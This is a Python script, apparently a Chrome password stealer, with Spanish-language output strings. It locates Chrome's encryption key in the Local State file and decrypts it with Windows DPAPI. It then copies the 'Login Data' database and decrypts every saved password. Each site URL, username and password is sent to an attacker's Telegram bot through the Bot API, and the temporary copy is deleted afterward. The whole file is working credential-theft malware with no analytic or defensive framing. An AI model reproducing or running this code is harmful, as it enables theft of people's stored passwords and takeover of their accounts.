import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import requests

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def find_login_data_path():
    base_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data"
    )

    # Listar todas las subcarpetas en User Data
    for root, dirs, files in os.walk(base_path):
        if "Login Data" in files:
            return os.path.join(root, "Login Data")

    return None

def send_to_telegram(message, token, chat_id):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    requests.post(url, data=payload)

def main():
    TOKEN = 'Your_Token'
    CHAT_ID = '-100 + Your_ChadId'
    
    key = get_encryption_key()
    db_path = find_login_data_path()

    if not db_path:
        print("No se encontró el archivo 'Login Data' en ninguno de los perfiles.")
        return

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("""
        SELECT origin_url, username_value, password_value, date_created, date_last_used 
        FROM logins 
        ORDER BY date_last_used DESC
    """)

    for row in cursor.fetchall():
        url_de_origen = row[0]
        usuario = row[1]
        contrasena = decrypt_password(row[2], key)
        fecha_de_creacion = row[3]
        fecha_de_ultimo_uso = row[4]

        if usuario or contrasena:
            message = f"<b>URL:</b> {url_de_origen}\n<b>Usuario:</b> {usuario}\n<b>Contraseña:</b> {contrasena}"
            
            if fecha_de_creacion != 86400000000 and fecha_de_creacion:
                message += f"\n<b>Fecha de Creación:</b> {str(get_chrome_datetime(fecha_de_creacion))}"
            
            if fecha_de_ultimo_uso != 86400000000 and fecha_de_ultimo_uso:
                message += f"\n<b>Fecha de Último Uso:</b> {str(get_chrome_datetime(fecha_de_ultimo_uso))}"
            
            message += "\n" + "Chrome " + "=" * 42
            send_to_telegram(message, TOKEN, CHAT_ID)
            
    cursor.close()
    db.close()
    os.remove(filename)

if __name__ == "__main__":
    main()
